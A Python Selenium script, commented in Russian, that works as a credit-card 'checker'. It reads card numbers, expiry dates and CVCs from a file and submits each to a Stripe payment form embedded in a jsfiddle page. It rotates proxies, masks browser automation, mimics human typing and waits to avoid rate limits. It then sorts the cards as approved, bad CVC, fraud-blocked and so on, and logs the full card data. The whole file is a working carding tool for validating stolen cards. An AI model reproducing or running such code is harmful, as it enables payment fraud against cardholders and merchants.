import os
import time
import random
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# =================================================================
# КОНФИГУРАЦИЯ (ЗАПОЛНИТЕ СВОИ ДАННЫЕ)
# =================================================================
STRIPE_PUBLIC_KEY = "ВАШ КЛЮЧ"  # Из Stripe Dashboard
CARDS_FILE = "cards.txt"                           # Файл с картами
REPORT_FILE = "report.txt"                         # Файл отчета
PROXY_LIST = [                                     # Резервные прокси
    "socks5://45.61.139.48:9999",
    "socks5://45.61.139.48:9999",
    "socks5://45.61.139.48:9999",
    "http://45.61.139.48:80",
    "http://45.61.139.48:80"
]

# =================================================================
# ОСНОВНОЙ КЛАСС ЧЕКЕРА
# =================================================================
class StripeCardChecker:
    def __init__(self):
        self.driver = None
        self.current_proxy = None
        self.init_driver()
        
    def init_driver(self):
        """Инициализация Chrome драйвера с прокси"""
        chrome_options = Options()
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--disable-software-rasterizer")
        
        # Рандомный прокси из списка
        self.current_proxy = random.choice(PROXY_LIST)
        chrome_options.add_argument(f"--proxy-server={self.current_proxy}")
        
        # Для отладки (раскомментируйте для видимого режима)
        # chrome_options.add_argument("--headless=new")
        
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=chrome_options)
        print(f"[DRIVER] Chrome initialized with proxy: {self.current_proxy}")

    def human_type(self, element, text):
        """Эмуляция человеческого ввода"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.08, 0.15))

    def process_card(self, card_line):
        """Обработка одной карты"""
        try:
            # Парсинг данных карты
            parts = card_line.strip().split('|')
            if len(parts) < 4: 
                return f"⚠️ INVALID FORMAT: {card_line}"
                
            number, exp_month, exp_year, cvc = parts
            bin_code = number[:6]  # BIN код
            
            print(f"[PROCESSING] Card: {number[:6]}XXXXXX|{exp_month}|{exp_year}|XXX")
            
            # Открываем тестовую страницу оплаты
            self.driver.get("https://jsfiddle.net/artemvh/6L4p25xg/1/show")
            time.sleep(3)
            
            # Переключаемся в iframe
            WebDriverWait(self.driver, 20).until(
                EC.frame_to_be_available_and_switch_to_it(
                    (By.CSS_SELECTOR, "iframe[name='result']")
                )
            )
            
            # Переключаемся во внутренний iframe Stripe
            WebDriverWait(self.driver, 20).until(
                EC.frame_to_be_available_and_switch_to_it(
                    (By.CSS_SELECTOR, "iframe[title='Secure card payment input frame']")
                )
            )
            
            # Заполняем данные карты
            number_field = WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.NAME, "cardnumber"))
            )
            self.human_type(number_field, number)
            
            exp_field = self.driver.find_element(By.NAME, "exp-date")
            self.human_type(exp_field, f"{exp_month}{exp_year[2:]}")
            
            cvc_field = self.driver.find_element(By.NAME, "cvc")
            self.human_type(cvc_field, cvc)
            
            # Возвращаемся в основной контекст
            self.driver.switch_to.default_content()
            self.driver.switch_to.frame("result")  # Возврат в родительский фрейм
            
            # Нажимаем кнопку оплаты
            pay_button = WebDriverWait(self.driver, 15).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
            )
            pay_button.click()
            
            # Ожидаем результат (увеличено время ожидания)
            time.sleep(5)
            
            # Проверяем результат
            try:
                # Успешная оплата
                success_element = WebDriverWait(self.driver, 10).until(
                    EC.visibility_of_element_located((By.XPATH, "//div[contains(text(), 'successful') or contains(text(), 'Success')]"))
                )
                return f"🇺🇸 {number}|{exp_month}|{exp_year}|{cvc} - ✅ APPROVED (BIN: {bin_code})"
            except:
                try:
                    # Ошибка оплаты
                    error_element = WebDriverWait(self.driver, 10).until(
                        EC.visibility_of_element_located((By.CSS_SELECTOR, "[role='alert'], .error-message"))
                    )
                    error_text = error_element.text
                    status = self.classify_error(error_text)
                    return f"🇺🇸 {number}|{exp_month}|{exp_year}|{cvc} - {status} (BIN: {bin_code})"
                except:
                    return f"🇺🇸 {number}|{exp_month}|{exp_year}|{cvc} - ⚠️ UNKNOWN ERROR (BIN: {bin_code})"
                    
        except Exception as e:
            return f"🇺🇸 {number}|{exp_month}|{exp_year}|{cvc} - ⚠️ SYSTEM ERROR: {str(e)}"

    def classify_error(self, error_text):
        """Классификация ошибок Stripe"""
        error_text = error_text.lower()
        
        if "incorrect cvc" in error_text or "invalid cvc" in error_text:
            return "❌ BAD CVC"
        elif "expired" in error_text:
            return "❌ EXPIRED CARD"
        elif "insufficient funds" in error_text:
            return "⚠️ INSUFFICIENT FUNDS"
        elif "stolen" in error_text or "fraud" in error_text:
            return "☢️ FRAUD BLOCK"
        elif "do not honor" in error_text:
            return "❌ DO NOT HONOR"
        elif "invalid account" in error_text:
            return "❌ INVALID ACCOUNT"
        elif "card was declined" in error_text:
            return "❌ DECLINED"
        elif "processing error" in error_text:
            return "☢️ PROCESSING ERROR"
        elif "rate limit" in error_text:
            return "☢️ RATE LIMIT EXCEEDED"
        elif "cannot authorize" in error_text:
            return "☢️ CANNOT AUTHORIZE (POLICY)"
        else:
            return f"❌ {error_text[:50]}..."  # Обрезаем длинные сообщения

    def run(self):
        """Основной метод запуска проверки"""
        # Проверка файла с картами
        if not os.path.exists(CARDS_FILE):
            print(f"❌ ERROR: File {CARDS_FILE} not found!")
            return
        
        with open(CARDS_FILE, "r") as f:
            cards = [line.strip() for line in f.readlines() if line.strip()]
        
        if not cards:
            print("❌ ERROR: No cards found")
            return
        
        print(f"🚀 Starting validation of {len(cards)} cards...")
        
        # Создание отчета
        with open(REPORT_FILE, "w", encoding="utf-8") as report:
            for i, card in enumerate(cards):
                print(f"\n[{i+1}/{len(cards)}] Processing card...")
                
                # Переинициализация драйвера каждые 5 карт
                if i > 0 and i % 5 == 0:
                    self.driver.quit()
                    self.init_driver()
                
                result = self.process_card(card)
                print(f"RESULT: {result}")
                report.write(result + "\n")
                report.flush()
                
                # Пауза между картами (2-4 минуты)
                if i < len(cards) - 1:
                    delay = random.randint(120, 240)
                    mins, secs = divmod(delay, 60)
                    print(f"⏳ Waiting {mins} min {secs} sec...")
                    time.sleep(delay)
        
        print("\n✅ Validation complete! Report saved to report.txt")
        self.driver.quit()

# =================================================================
# ЗАПУСК ПРОГРАММЫ
# =================================================================
if __name__ == "__main__":
    # Проверка обязательных параметров
    if CARDS_FILE and os.path.exists(CARDS_FILE):
        checker = StripeCardChecker()
        checker.run()
    else:
        print(f"❌ ERROR: Cards file not found: {CARDS_FILE}")